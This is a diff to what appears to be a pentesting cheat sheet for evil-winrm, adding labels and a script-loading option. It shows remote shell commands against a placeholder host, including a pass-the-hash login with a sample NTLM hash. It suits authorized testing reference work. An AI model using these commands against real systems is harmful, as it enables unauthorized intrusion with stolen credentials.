@@ -12,8 +12,11 @@ render_with_liquid: false
 ```sh
 evil-winrm -i 10.0.0.1 -P 5985 -u username -p password
 
-# Pass The Hash
+# Pass The Hash (-H)
 evil-winrm -i 10.0.0.1 -P 5985 -u username -H 0e0363213e37b94221497260b0bcb4fc
+
+# PowerShell Local Path (-s)
+evil-winrm -i 10.0.0.1 -u username -p password -s /opt/scripts
 ```
 
 <br />
